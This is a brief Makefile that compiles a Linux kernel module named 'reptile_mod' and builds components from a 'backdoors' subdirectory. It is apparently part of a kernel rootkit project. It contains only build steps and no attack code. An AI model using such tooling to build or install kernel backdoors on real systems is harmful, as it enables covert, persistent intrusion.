obj-m += reptile_mod.o
reptile-objs := reptile_mod.o

all:
	mkdir -p bin
	cd backdoors && make all
	$(MAKE) -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
	cp reptile_mod.ko bin/reptile_mod

clean:
	cd backdoors && make clean
	$(MAKE) -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
